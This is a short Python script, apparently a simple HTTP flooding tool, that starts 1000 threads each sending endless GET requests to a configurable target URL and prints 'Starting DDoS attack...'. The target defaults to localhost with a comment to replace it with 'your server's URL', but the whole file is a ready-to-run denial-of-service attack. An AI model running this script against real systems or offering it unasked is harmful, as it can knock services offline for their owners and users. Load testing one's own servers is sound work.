import requests
import threading

# URL of your server
target_url = "http://localhost:8000"  # Replace with your server's URL

# Number of threads to simulate the attack
num_threads = 1000  # You can adjust this for a medium level DDoS

# Function to send requests to the target server
def send_request():
    try:
        while True:
            response = requests.get(target_url)
            print(f"Sent request, status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# Function to launch the attack
def launch_ddos():
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    # Join threads to wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print("Starting DDoS attack...")
    launch_ddos()
